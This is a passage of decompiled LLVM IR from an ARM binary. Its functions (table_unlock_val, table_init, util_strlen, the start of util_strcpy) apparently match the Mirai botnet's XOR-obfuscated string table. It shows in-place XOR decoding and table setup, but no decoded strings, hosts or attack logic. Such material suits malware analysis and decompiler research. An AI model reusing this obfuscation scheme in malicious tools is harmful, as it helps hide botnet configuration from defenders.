dec_label_pc_1137c:                               ; preds = %dec_label_pc_1137c.dec_label_pc_1137c_crit_edge, %dec_label_pc_11378
  %v0_11384 = phi i32 [ %v0_11384.pre, %dec_label_pc_1137c.dec_label_pc_1137c_crit_edge ], [ %v1_11370, %dec_label_pc_11378 ]
  %v2_11388 = phi i32 [ %v1_113c0, %dec_label_pc_1137c.dec_label_pc_1137c_crit_edge ], [ 0, %dec_label_pc_11378 ]
  %v2_1137c = load i32, i32* %v1_1137c, align 4
  %v2_11380 = add i32 %v2_1137c, %v2_11388
  %v3_11380 = inttoptr i32 %v2_11380 to i8*
  %v4_11380 = load i8, i8* %v3_11380, align 1
  %v6_11380 = zext i8 %v4_11380 to i32
  %v2_11384 = xor i32 %v6_11380, %v0_11384
  %v1_11388 = trunc i32 %v2_11384 to i8
  store i8 %v1_11388, i8* %v3_11380, align 1
  %v2_1138c = load i32, i32* %v1_1137c, align 4
  %v0_11390 = load i32, i32* @ip, align 4
  %v2_11390 = add i32 %v0_11390, %v2_1138c
  %v3_11390 = inttoptr i32 %v2_11390 to i8*
  %v4_11390 = load i8, i8* %v3_11390, align 1
  %v6_11390 = zext i8 %v4_11390 to i32
  %v0_11394 = load i32, i32* %r6.global-to-local, align 4
  %v2_11394 = xor i32 %v0_11394, %v6_11390
  %v1_11398 = trunc i32 %v2_11394 to i8
  store i8 %v1_11398, i8* %v3_11390, align 1
  %v2_1139c = load i32, i32* %v1_1137c, align 4
  %v0_113a0 = load i32, i32* @ip, align 4
  %v2_113a0 = add i32 %v0_113a0, %v2_1139c
  %v3_113a0 = inttoptr i32 %v2_113a0 to i8*
  %v4_113a0 = load i8, i8* %v3_113a0, align 1
  %v6_113a0 = zext i8 %v4_113a0 to i32
  %v0_113a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_113a4 = xor i32 %v0_113a4, %v6_113a0
  %v1_113a8 = trunc i32 %v2_113a4 to i8
  store i8 %v1_113a8, i8* %v3_113a0, align 1
  %v2_113ac = load i32, i32* %v1_1137c, align 4
  store i32 %v2_113ac, i32* @r1, align 4
  %v0_113b0 = load i32, i32* @ip, align 4
  %v2_113b0 = add i32 %v0_113b0, %v2_113ac
  %v3_113b0 = inttoptr i32 %v2_113b0 to i8*
  %v4_113b0 = load i8, i8* %v3_113b0, align 1
  %v6_113b0 = zext i8 %v4_113b0 to i32
  %v0_113b4 = load i32, i32* %r4.global-to-local, align 4
  %v2_113b4 = xor i32 %v0_113b4, %v6_113b0
  store i32 %v2_113b4, i32* @r3, align 4
  %v1_113b8 = trunc i32 %v2_113b4 to i8
  store i8 %v1_113b8, i8* %v3_113b0, align 1
  %v3_113bc = load i16, i16* %v2_11350, align 4
  %v4_113bc = zext i16 %v3_113bc to i32
  %v0_113c0 = load i32, i32* @ip, align 4
  %v1_113c0 = add i32 %v0_113c0, 1
  store i32 %v1_113c0, i32* @ip, align 4
  %v9_113c4 = icmp eq i32 %v4_113bc, %v1_113c0
  store i1 %v9_113c4, i1* @cpsr_z, align 1
  %v8_113c8 = icmp sgt i32 %v4_113bc, %v1_113c0
  br i1 %v8_113c8, label %dec_label_pc_1137c.dec_label_pc_1137c_crit_edge, label %dec_label_pc_113cc.loopexit

dec_label_pc_1137c.dec_label_pc_1137c_crit_edge:  ; preds = %dec_label_pc_1137c
  %v0_11384.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_1137c

dec_label_pc_113cc.loopexit:                      ; preds = %dec_label_pc_1137c
  %v2_113cc.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_113cc

dec_label_pc_113cc:                               ; preds = %dec_label_pc_113cc.loopexit, %entry
  %v2_113cc = phi i32 [ %v2_113cc.pre, %dec_label_pc_113cc.loopexit ], [ %v3_11360, %entry ]
  store i32 %v2_113cc, i32* @r4, align 4
  ret i32 %v2_11348

; uselistorder directives
  uselistorder i32 %v1_113c0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_11370, { 1, 0 }
  uselistorder i32 %v3_1135c, { 1, 0 }
  uselistorder i32 %v2_1134c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_11344, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_113e4 = mul i32 %arg1, 8
  %v2_113e8 = add i32 %v3_113e4, ptrtoint (i32* @global_var_25d74.234 to i32)
  %v2_113ec = load i32, i32* @global_var_230c4.237, align 4
  %v1_113f0 = add i32 %v3_113e4, add (i32 ptrtoint (i32* @global_var_25d74.234 to i32), i32 4)
  %v2_113f0 = inttoptr i32 %v1_113f0 to i16*
  %v3_113f0 = load i16, i16* %v2_113f0, align 4
  %v3_113f4 = udiv i32 %v2_113ec, 256
  %v2_113f8 = icmp eq i16 %v3_113f0, 0
  %v3_113fc = udiv i32 %v2_113ec, 65536
  %v3_11400 = load i32, i32* @r4, align 4
  store i32 %v3_11400, i32* %stack_var_-16, align 4
  %v1_11404 = urem i32 %v3_113f4, 256
  store i32 %v1_11404, i32* %r6.global-to-local, align 4
  %v1_11408 = urem i32 %v3_113fc, 256
  store i32 %v1_11408, i32* %r5.global-to-local, align 4
  %v3_1140c = udiv i32 %v2_113ec, 16777216
  store i32 %v3_1140c, i32* %r4.global-to-local, align 4
  %v1_11410 = urem i32 %v2_113ec, 256
  store i32 %v1_11410, i32* %lr.global-to-local, align 4
  br i1 %v2_113f8, label %dec_label_pc_1146c, label %dec_label_pc_11418

dec_label_pc_11418:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_1141c = inttoptr i32 %v2_113e8 to i32*
  br label %dec_label_pc_1141c

dec_label_pc_1141c:                               ; preds = %dec_label_pc_1141c.dec_label_pc_1141c_crit_edge, %dec_label_pc_11418
  %v0_11424 = phi i32 [ %v0_11424.pre, %dec_label_pc_1141c.dec_label_pc_1141c_crit_edge ], [ %v1_11410, %dec_label_pc_11418 ]
  %v2_11428 = phi i32 [ %v1_11460, %dec_label_pc_1141c.dec_label_pc_1141c_crit_edge ], [ 0, %dec_label_pc_11418 ]
  %v2_1141c = load i32, i32* %v1_1141c, align 4
  %v2_11420 = add i32 %v2_1141c, %v2_11428
  %v3_11420 = inttoptr i32 %v2_11420 to i8*
  %v4_11420 = load i8, i8* %v3_11420, align 1
  %v6_11420 = zext i8 %v4_11420 to i32
  %v2_11424 = xor i32 %v6_11420, %v0_11424
  %v1_11428 = trunc i32 %v2_11424 to i8
  store i8 %v1_11428, i8* %v3_11420, align 1
  %v2_1142c = load i32, i32* %v1_1141c, align 4
  %v0_11430 = load i32, i32* @ip, align 4
  %v2_11430 = add i32 %v0_11430, %v2_1142c
  %v3_11430 = inttoptr i32 %v2_11430 to i8*
  %v4_11430 = load i8, i8* %v3_11430, align 1
  %v6_11430 = zext i8 %v4_11430 to i32
  %v0_11434 = load i32, i32* %r6.global-to-local, align 4
  %v2_11434 = xor i32 %v0_11434, %v6_11430
  %v1_11438 = trunc i32 %v2_11434 to i8
  store i8 %v1_11438, i8* %v3_11430, align 1
  %v2_1143c = load i32, i32* %v1_1141c, align 4
  %v0_11440 = load i32, i32* @ip, align 4
  %v2_11440 = add i32 %v0_11440, %v2_1143c
  %v3_11440 = inttoptr i32 %v2_11440 to i8*
  %v4_11440 = load i8, i8* %v3_11440, align 1
  %v6_11440 = zext i8 %v4_11440 to i32
  %v0_11444 = load i32, i32* %r5.global-to-local, align 4
  %v2_11444 = xor i32 %v0_11444, %v6_11440
  %v1_11448 = trunc i32 %v2_11444 to i8
  store i8 %v1_11448, i8* %v3_11440, align 1
  %v2_1144c = load i32, i32* %v1_1141c, align 4
  %v0_11450 = load i32, i32* @ip, align 4
  %v2_11450 = add i32 %v0_11450, %v2_1144c
  %v3_11450 = inttoptr i32 %v2_11450 to i8*
  %v4_11450 = load i8, i8* %v3_11450, align 1
  %v6_11450 = zext i8 %v4_11450 to i32
  %v0_11454 = load i32, i32* %r4.global-to-local, align 4
  %v2_11454 = xor i32 %v0_11454, %v6_11450
  %v1_11458 = trunc i32 %v2_11454 to i8
  store i8 %v1_11458, i8* %v3_11450, align 1
  %v3_1145c = load i16, i16* %v2_113f0, align 4
  %v4_1145c = zext i16 %v3_1145c to i32
  %v0_11460 = load i32, i32* @ip, align 4
  %v1_11460 = add i32 %v0_11460, 1
  store i32 %v1_11460, i32* @ip, align 4
  %v8_11468 = icmp sgt i32 %v4_1145c, %v1_11460
  br i1 %v8_11468, label %dec_label_pc_1141c.dec_label_pc_1141c_crit_edge, label %dec_label_pc_1146c.loopexit

dec_label_pc_1141c.dec_label_pc_1141c_crit_edge:  ; preds = %dec_label_pc_1141c
  %v0_11424.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_1141c

dec_label_pc_1146c.loopexit:                      ; preds = %dec_label_pc_1141c
  %v2_1146c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_1146c

dec_label_pc_1146c:                               ; preds = %dec_label_pc_1146c.loopexit, %entry
  %v2_1146c = phi i32 [ %v2_1146c.pre, %dec_label_pc_1146c.loopexit ], [ %v3_11400, %entry ]
  store i32 %v2_1146c, i32* @r4, align 4
  ret i32 %v2_113e8

; uselistorder directives
  uselistorder i32 %v1_11460, { 1, 2, 0 }
  uselistorder i32 %v1_11410, { 1, 0 }
  uselistorder i32 %v2_113ec, { 3, 0, 1, 2 }
  uselistorder i32 %v3_113e4, { 1, 0 }
}

define i32 @table_init(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v9_1147c = load i32, i32* @r6, align 4
  %v12_1147c = load i32, i32* @r7, align 4
  %v15_1147c = load i32, i32* @r8, align 4
  %v21_1147c = load i32, i32* @sl, align 4
  %v24_1147c = load i32, i32* @fp, align 4
  store i32 2, i32* @r0, align 4
  %v0_11488 = call i32 @malloc()
  store i32 2, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_25d74.234 to i32), i32* @r4, align 4
  store i32 %v0_11488, i32* @r6, align 4
  %v4_114a0 = call i32 @util_memcpy(i32 %v0_11488, i32 ptrtoint ([3 x i8]* @global_var_1a864.242 to i32), i32 2)
  %v0_114a4 = load i32, i32* @r5, align 4
  store i32 %v0_114a4, i32* @r0, align 4
  %v0_114a8 = load i32, i32* @r6, align 4
  store i32 %v0_114a8, i32* @global_var_25d7c.243, align 4
  %v1_114ac = trunc i32 %v0_114a4 to i16
  store i16 %v1_114ac, i16* bitcast (i32* @global_var_25d80.244 to i16*), align 4
  %v0_114b0 = call i32 @malloc()
  %v0_114b4 = load i32, i32* @r5, align 4
  store i32 %v0_114b0, i32* @r6, align 4
  %v3_114c0 = call i32 @util_memcpy(i32 %v0_114b0, i32 ptrtoint (i32* @global_var_1a868.246 to i32), i32 %v0_114b4)
  store i32 29, i32* @r0, align 4
  %v0_114c8 = load i32, i32* @r6, align 4
  store i32 %v0_114c8, i32* @global_var_25d84.247, align 4
  %v0_114cc = load i32, i32* @r5, align 4
  %v1_114cc = trunc i32 %v0_114cc to i16
  store i16 %v1_114cc, i16* bitcast (i32* @global_var_25d88.248 to i16*), align 4
  %v0_114d0 = call i32 @malloc()
  store i32 %v0_114d0, i32* @r5, align 4
  %v3_114e0 = call i32 @util_memcpy(i32 %v0_114d0, i32 ptrtoint (i32* @global_var_1a9d0.250 to i32), i32 29)
  store i32 6, i32* @r0, align 4
  store i16 29, i16* bitcast (i32* @global_var_25d90.251 to i16*), align 4
  %v0_114f0 = load i32, i32* @r5, align 4
  store i32 %v0_114f0, i32* @global_var_25d8c.252, align 4
  %v0_114f4 = call i32 @malloc()
  store i32 6, i32* @sb, align 4
  store i32 %v0_114f4, i32* @r5, align 4
  %v4_11508 = call i32 @util_memcpy(i32 %v0_114f4, i32 ptrtoint ([7 x i8]* @global_var_1a86c.254 to i32), i32 6)
  store i32 7, i32* @r0, align 4
  store i32 7, i32* @r7, align 4
  %v0_11514 = load i32, i32* @r5, align 4
  store i32 %v0_11514, i32* @global_var_25d94.255, align 4
  %v0_11518 = load i32, i32* @sb, align 4
  %v1_11518 = trunc i32 %v0_11518 to i16
  store i16 %v1_11518, i16* bitcast (i32* @global_var_25d98.256 to i16*), align 4
  %v0_1151c = call i32 @malloc()
  %v0_11524 = load i32, i32* @r7, align 4
  store i32 %v0_1151c, i32* @r5, align 4
  %v4_1152c = call i32 @util_memcpy(i32 %v0_1151c, i32 ptrtoint ([8 x i8]* @global_var_1a874.258 to i32), i32 %v0_11524)
  %v0_11530 = load i32, i32* @r7, align 4
  store i32 %v0_11530, i32* @r0, align 4
  %v0_11534 = load i32, i32* @r5, align 4
  store i32 %v0_11534, i32* @global_var_25d9c.259, align 4
  %v1_11538 = trunc i32 %v0_11530 to i16
  store i16 %v1_11538, i16* bitcast (i32* @global_var_25da0.260 to i16*), align 4
  %v0_1153c = call i32 @malloc()
  %v0_11544 = load i32, i32* @r7, align 4
  store i32 %v0_1153c, i32* @r5, align 4
  %v4_1154c = call i32 @util_memcpy(i32 %v0_1153c, i32 ptrtoint ([8 x i8]* @global_var_1a87c.262 to i32), i32 %v0_11544)
  store i32 3, i32* @r0, align 4
  %v0_11554 = load i32, i32* @r5, align 4
  store i32 %v0_11554, i32* @global_var_25da4.263, align 4
  %v0_11558 = load i32, i32* @r7, align 4
  %v1_11558 = trunc i32 %v0_11558 to i16
  store i16 %v1_11558, i16* bitcast (i32* @global_var_25da8.264 to i16*), align 4
  %v0_1155c = call i32 @malloc()
  store i32 %v0_1155c, i32* @r5, align 4
  %v4_1156c = call i32 @util_memcpy(i32 %v0_1155c, i32 ptrtoint ([4 x i8]* @global_var_1a884.266 to i32), i32 3)
  store i32 19, i32* @r0, align 4
  store i16 3, i16* bitcast (i32* @global_var_25db0.267 to i16*), align 4
  %v0_1157c = load i32, i32* @r5, align 4
  store i32 %v0_1157c, i32* @global_var_25dac.268, align 4
  %v0_11580 = call i32 @malloc()
  store i32 %v0_11580, i32* @r5, align 4
  %v3_11590 = call i32 @util_memcpy(i32 %v0_11580, i32 ptrtoint (i32* @global_var_1a888.270 to i32), i32 19)
  store i32 24, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_25db8.271 to i16*), align 4
  %v0_115a0 = load i32, i32* @r5, align 4
  store i32 %v0_115a0, i32* @global_var_25db4.272, align 4
  %v0_115a4 = call i32 @malloc()
  store i32 %v0_115a4, i32* @r5, align 4
  %v3_115b4 = call i32 @util_memcpy(i32 %v0_115a4, i32 ptrtoint (i32* @global_var_1a89c.274 to i32), i32 24)
  store i32 9, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_25dc0.275 to i16*), align 4
  %v0_115c4 = load i32, i32* @r5, align 4
  store i32 %v0_115c4, i32* @global_var_25dbc.276, align 4
  %v0_115c8 = call i32 @malloc()
  store i32 %v0_115c8, i32* @r5, align 4
  %v4_115d8 = call i32 @util_memcpy(i32 %v0_115c8, i32 ptrtoint ([10 x i8]* @global_var_1a8b8.278 to i32), i32 9)
  store i32 16, i32* @r0, align 4
  store i16 9, i16* bitcast (i32* @global_var_25dc8.279 to i16*), align 4
  %v0_115e8 = load i32, i32* @r5, align 4
  store i32 %v0_115e8, i32* @global_var_25dc4.280, align 4
  %v0_115ec = call i32 @malloc()
  store i32 %v0_115ec, i32* @r5, align 4
  store i32 16, i32* @sl, align 4
  %v4_11600 = call i32 @util_memcpy(i32 %v0_115ec, i32 ptrtoint ([17 x i8]* @global_var_1a8c4.282 to i32), i32 16)
  store i32 22, i32* @r0, align 4
  %v0_11608 = load i32, i32* @r5, align 4
  store i32 %v0_11608, i32* @global_var_25dcc.283, align 4
  %v0_1160c = load i32, i32* @sl, align 4
  %v1_1160c = trunc i32 %v0_1160c to i16
  store i16 %v1_1160c, i16* bitcast (i32* @global_var_25dd0.284 to i16*), align 4
  %v0_11610 = call i32 @malloc()
  store i32 %v0_11610, i32* @r5, align 4
  %v4_11620 = call i32 @util_memcpy(i32 %v0_11610, i32 ptrtoint ([23 x i8]* @global_var_1a8d8.286 to i32), i32 22)
  %v0_11628 = load i32, i32* @r7, align 4
  store i32 %v0_11628, i32* @r0, align 4
  store i16 22, i16* bitcast (i32* @global_var_25dd8.287 to i16*), align 4
  %v0_11630 = load i32, i32* @r5, align 4
  store i32 %v0_11630, i32* @global_var_25dd4.288, align 4
  %v0_11634 = call i32 @malloc()
  %v0_1163c = load i32, i32* @r7, align 4
  store i32 %v0_11634, i32* @r5, align 4
  %v4_11644 = call i32 @util_memcpy(i32 %v0_11634, i32 ptrtoint ([8 x i8]* @global_var_1a8f0.290 to i32), i32 %v0_1163c)
  store i32 5, i32* @r0, align 4
  %v0_1164c = load i32, i32* @r5, align 4
  store i32 %v0_1164c, i32* @global_var_25ddc.291, align 4
  %v0_11650 = load i32, i32* @r7, align 4
  %v1_11650 = trunc i32 %v0_11650 to i16
  store i16 %v1_11650, i16* bitcast (i32* @global_var_25de0.292 to i16*), align 4
  %v0_11654 = call i32 @malloc()
  store i32 %v0_11654, i32* @r5, align 4
  store i32 5, i32* @fp, align 4
  %v4_11668 = call i32 @util_memcpy(i32 %v0_11654, i32 ptrtoint ([6 x i8]* @global_var_1a8f8.294 to i32), i32 5)
  store i32 4, i32* @r0, align 4
  %v0_11670 = load i32, i32* @r5, align 4
  store i32 %v0_11670, i32* @global_var_25de4.295, align 4
  %v0_11674 = load i32, i32* @fp, align 4
  %v1_11674 = trunc i32 %v0_11674 to i16
  store i16 %v1_11674, i16* bitcast (i32* @global_var_25de8.296 to i16*), align 4
  %v0_11678 = call i32 @malloc()
  store i32 %v0_11678, i32* @r5, align 4
  %v4_11688 = call i32 @util_memcpy(i32 %v0_11678, i32 ptrtoint ([5 x i8]* @global_var_1a900.298 to i32), i32 4)
  %v0_11690 = load i32, i32* @sb, align 4
  store i32 %v0_11690, i32* @r0, align 4
  store i16 4, i16* bitcast (i32* @global_var_25df0.299 to i16*), align 4
  %v0_11698 = load i32, i32* @r5, align 4
  store i32 %v0_11698, i32* @global_var_25dec.300, align 4
  %v0_1169c = call i32 @malloc()
  %v0_116a4 = load i32, i32* @sb, align 4
  store i32 %v0_1169c, i32* @r5, align 4
  %v4_116ac = call i32 @util_memcpy(i32 %v0_1169c, i32 ptrtoint ([7 x i8]* @global_var_1a908.302 to i32), i32 %v0_116a4)
  store i32 14, i32* @r0, align 4
  %v0_116b4 = load i32, i32* @r5, align 4
  store i32 %v0_116b4, i32* @global_var_25df4.303, align 4
  %v0_116b8 = load i32, i32* @sb, align 4
  %v1_116b8 = trunc i32 %v0_116b8 to i16
  store i16 %v1_116b8, i16* bitcast (i32* @global_var_25df8.304 to i16*), align 4
  %v0_116bc = call i32 @malloc()
  store i32 %v0_116bc, i32* @r5, align 4
  store i32 14, i32* @r8, align 4
  %v4_116d0 = call i32 @util_memcpy(i32 %v0_116bc, i32 ptrtoint ([15 x i8]* @global_var_1a910.306 to i32), i32 14)
  store i32 8, i32* @r0, align 4
  %v0_116d8 = load i32, i32* @r5, align 4
  store i32 %v0_116d8, i32* @global_var_25dfc.307, align 4
  %v0_116dc = load i32, i32* @r8, align 4
  %v1_116dc = trunc i32 %v0_116dc to i16
  store i16 %v1_116dc, i16* bitcast (i32* @global_var_25e00.308 to i16*), align 4
  %v0_116e0 = call i32 @malloc()
  store i32 8, i32* @r6, align 4
  store i32 %v0_116e0, i32* @r5, align 4
  %v4_116f4 = call i32 @util_memcpy(i32 %v0_116e0, i32 ptrtoint ([9 x i8]* @global_var_1a920.310 to i32), i32 8)
  %v0_116f8 = load i32, i32* @r7, align 4
  store i32 %v0_116f8, i32* @r0, align 4
  %v0_116fc = load i32, i32* @r5, align 4
  store i32 %v0_116fc, i32* @global_var_25e5c.311, align 4
  %v0_11700 = load i32, i32* @r6, align 4
  %v1_11700 = trunc i32 %v0_11700 to i16
  store i16 %v1_11700, i16* bitcast (i32* @global_var_25e60.312 to i16*), align 4
  %v0_11704 = call i32 @malloc()
  %v0_1170c = load i32, i32* @r7, align 4
  store i32 %v0_11704, i32* @r5, align 4
  %v4_11714 = call i32 @util_memcpy(i32 %v0_11704, i32 ptrtoint ([8 x i8]* @global_var_1a92c.314 to i32), i32 %v0_1170c)
  %v0_11718 = load i32, i32* @sl, align 4
  store i32 %v0_11718, i32* @r0, align 4
  %v0_1171c = load i32, i32* @r5, align 4
  store i32 %v0_1171c, i32* @global_var_25e64.315, align 4
  %v0_11720 = load i32, i32* @r7, align 4
  %v1_11720 = trunc i32 %v0_11720 to i16
  store i16 %v1_11720, i16* bitcast (i32* @global_var_25e68.316 to i16*), align 4
  %v0_11724 = call i32 @malloc()
  %v0_1172c = load i32, i32* @sl, align 4
  store i32 %v0_11724, i32* @r5, align 4
  %v4_11734 = call i32 @util_memcpy(i32 %v0_11724, i32 ptrtoint ([17 x i8]* @global_var_1a934.318 to i32), i32 %v0_1172c)
  %v0_11738 = load i32, i32* @r6, align 4
  store i32 %v0_11738, i32* @r0, align 4
  %v0_1173c = load i32, i32* @r5, align 4
  store i32 %v0_1173c, i32* @global_var_25e04.319, align 4
  %v0_11740 = load i32, i32* @sl, align 4
  %v1_11740 = trunc i32 %v0_11740 to i16
  store i16 %v1_11740, i16* bitcast (i32* @global_var_25e08.320 to i16*), align 4
  %v0_11744 = call i32 @malloc()
  %v0_1174c = load i32, i32* @r6, align 4
  store i32 %v0_11744, i32* @r5, align 4
  %v4_11754 = call i32 @util_memcpy(i32 %v0_11744, i32 ptrtoint ([9 x i8]* @global_var_1a948.322 to i32), i32 %v0_1174c)
  store i32 21, i32* @r0, align 4
  %v0_1175c = load i32, i32* @r5, align 4
  store i32 %v0_1175c, i32* @global_var_25e0c.323, align 4
  %v0_11760 = load i32, i32* @r6, align 4
  %v1_11760 = trunc i32 %v0_11760 to i16
  store i16 %v1_11760, i16* bitcast (i32* @global_var_25e10.324 to i16*), align 4
  %v0_11764 = call i32 @malloc()
  store i32 %v0_11764, i32* @r5, align 4
  %v3_11774 = call i32 @util_memcpy(i32 %v0_11764, i32 ptrtoint (i32* @global_var_1a9f0.326 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  store i16 21, i16* bitcast (i32* @global_var_25e18.327 to i16*), align 4
  %v0_11784 = load i32, i32* @r5, align 4
  store i32 %v0_11784, i32* @global_var_25e14.328, align 4
  %v0_11788 = call i32 @malloc()
  store i32 %v0_11788, i32* @r5, align 4
  %v4_11798 = call i32 @util_memcpy(i32 %v0_11788, i32 ptrtoint ([18 x i8]* @global_var_1a954.330 to i32), i32 17)
  store i32 12, i32* @r0, align 4
  store i16 17, i16* bitcast (i32* @global_var_25e20.331 to i16*), align 4
  %v0_117a8 = load i32, i32* @r5, align 4
  store i32 %v0_117a8, i32* @global_var_25e1c.332, align 4
  %v0_117ac = call i32 @malloc()
  store i32 %v0_117ac, i32* @r5, align 4
  %v4_117bc = call i32 @util_memcpy(i32 %v0_117ac, i32 ptrtoint ([13 x i8]* @global_var_1a968.334 to i32), i32 12)
  %v0_117c4 = load i32, i32* @r8, align 4
  store i32 %v0_117c4, i32* @r0, align 4
  store i16 12, i16* bitcast (i32* @global_var_25e28.335 to i16*), align 4
  %v0_117cc = load i32, i32* @r5, align 4
  store i32 %v0_117cc, i32* @global_var_25e24.336, align 4
  %v0_117d0 = call i32 @malloc()
  %v0_117d8 = load i32, i32* @r8, align 4
  store i32 %v0_117d0, i32* @r5, align 4
  %v4_117e0 = call i32 @util_memcpy(i32 %v0_117d0, i32 ptrtoint ([15 x i8]* @global_var_1a978.338 to i32), i32 %v0_117d8)
  store i32 19, i32* @r0, align 4
  %v0_117e8 = load i32, i32* @r5, align 4
  store i32 %v0_117e8, i32* @global_var_25e2c.339, align 4
  %v0_117ec = load i32, i32* @r8, align 4
  %v1_117ec = trunc i32 %v0_117ec to i16
  store i16 %v1_117ec, i16* bitcast (i32* @global_var_25e30.340 to i16*), align 4
  %v0_117f0 = call i32 @malloc()
  store i32 %v0_117f0, i32* @r5, align 4
  %v4_11800 = call i32 @util_memcpy(i32 %v0_117f0, i32 ptrtoint ([20 x i8]* @global_var_1a988.342 to i32), i32 19)
  %v0_11808 = load i32, i32* @r6, align 4
  store i32 %v0_11808, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_25e38.343 to i16*), align 4
  %v0_11810 = load i32, i32* @r5, align 4
  store i32 %v0_11810, i32* @global_var_25e34.344, align 4
  %v0_11814 = call i32 @malloc()
  %v0_1181c = load i32, i32* @r6, align 4
  store i32 %v0_11814, i32* @r5, align 4
  %v4_11824 = call i32 @util_memcpy(i32 %v0_11814, i32 ptrtoint ([9 x i8]* @global_var_1a99c.346 to i32), i32 %v0_1181c)
  %v0_11828 = load i32, i32* @fp, align 4
  store i32 %v0_11828, i32* @r0, align 4
  %v0_1182c = load i32, i32* @r5, align 4
  store i32 %v0_1182c, i32* @global_var_25e3c.347, align 4
  %v0_11830 = load i32, i32* @r6, align 4
  %v1_11830 = trunc i32 %v0_11830 to i16
  store i16 %v1_11830, i16* bitcast (i32* @global_var_25e40.348 to i16*), align 4
  %v0_11834 = call i32 @malloc()
  %v0_1183c = load i32, i32* @fp, align 4
  store i32 %v0_11834, i32* @r5, align 4
  %v4_11844 = call i32 @util_memcpy(i32 %v0_11834, i32 ptrtoint ([6 x i8]* @global_var_1a9a8.350 to i32), i32 %v0_1183c)
  %v0_11848 = load i32, i32* @sb, align 4
  store i32 %v0_11848, i32* @r0, align 4
  %v0_1184c = load i32, i32* @r5, align 4
  store i32 %v0_1184c, i32* @global_var_25e44.351, align 4
  %v0_11850 = load i32, i32* @fp, align 4
  %v1_11850 = trunc i32 %v0_11850 to i16
  store i16 %v1_11850, i16* bitcast (i32* @global_var_25e48.352 to i16*), align 4
  %v0_11854 = call i32 @malloc()
  %v0_1185c = load i32, i32* @sb, align 4
  store i32 %v0_11854, i32* @r5, align 4
  %v4_11864 = call i32 @util_memcpy(i32 %v0_11854, i32 ptrtoint ([7 x i8]* @global_var_1a9b0.354 to i32), i32 %v0_1185c)
  store i32 23, i32* @r0, align 4
  %v0_1186c = load i32, i32* @r5, align 4
  store i32 %v0_1186c, i32* @global_var_25e4c.355, align 4
  %v0_11870 = load i32, i32* @sb, align 4
  %v1_11870 = trunc i32 %v0_11870 to i16
  store i16 %v1_11870, i16* bitcast (i32* @global_var_25e50.356 to i16*), align 4
  %v0_11874 = call i32 @malloc()
  %v4_11884 = call i32 @util_memcpy(i32 %v0_11874, i32 ptrtoint ([24 x i8]* @global_var_1a9b8.358 to i32), i32 23)
  store i32 %v0_11874, i32* @global_var_25e54.359, align 4
  store i16 23, i16* bitcast (i32* @global_var_25e58.360 to i16*), align 4
  store i32 %v9_1147c, i32* @r6, align 4
  store i32 %v12_1147c, i32* @r7, align 4
  store i32 %v15_1147c, i32* @r8, align 4
  store i32 %v21_1147c, i32* @sl, align 4
  store i32 %v24_1147c, i32* @fp, align 4
  ret i32 %v4_11884

; uselistorder directives
  uselistorder i32 %v0_11854, { 1, 0 }
  uselistorder i32 %v0_11834, { 1, 0 }
  uselistorder i32 %v0_11814, { 1, 0 }
  uselistorder i32 %v0_117d0, { 1, 0 }
  uselistorder i32 %v0_11744, { 1, 0 }
  uselistorder i32 %v0_11724, { 1, 0 }
  uselistorder i32 %v0_11704, { 1, 0 }
  uselistorder i32 %v0_116e0, { 1, 0 }
  uselistorder i32 %v0_1169c, { 1, 0 }
  uselistorder i32 %v0_11634, { 1, 0 }
  uselistorder i32 %v0_1153c, { 1, 0 }
  uselistorder i32 %v0_1151c, { 1, 0 }
  uselistorder i32 %v0_114f4, { 1, 0 }
  uselistorder i32 %v0_114b0, { 1, 0 }
  uselistorder i32 %v0_11488, { 1, 0 }
  uselistorder i32 23, { 0, 4, 5, 6, 1, 2, 3 }
  uselistorder i32 29, { 0, 6, 3, 4, 5, 2, 7, 1 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 1, 0, 7, 6, 4, 3, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_25d74.234 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_11920 = load i8, i8* %arg1, align 1
  %v2_11924 = icmp eq i8 %v3_11920, 0
  %v0_11928 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_11924, i32 %v0_11928)
  br label %dec_label_pc_11930

dec_label_pc_11930:                               ; preds = %dec_label_pc_11930, %entry
  %v0_11930 = phi i32 [ %v1_11930, %dec_label_pc_11930 ], [ 0, %entry ]
  %v1_11930 = add i32 %v0_11930, 1
  %v2_11934 = add i32 %v1_11930, %tmp
  %v3_11934 = inttoptr i32 %v2_11934 to i8*
  %v4_11934 = load i8, i8* %v3_11934, align 1
  %v6_11934 = zext i8 %v4_11934 to i32
  store i32 %v6_11934, i32* @r3, align 4
  %v2_11938 = icmp eq i8 %v4_11934, 0
  br i1 %v2_11938, label %dec_label_pc_11940, label %dec_label_pc_11930

dec_label_pc_11940:                               ; preds = %dec_label_pc_11930
  ret i32 %v1_11930
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
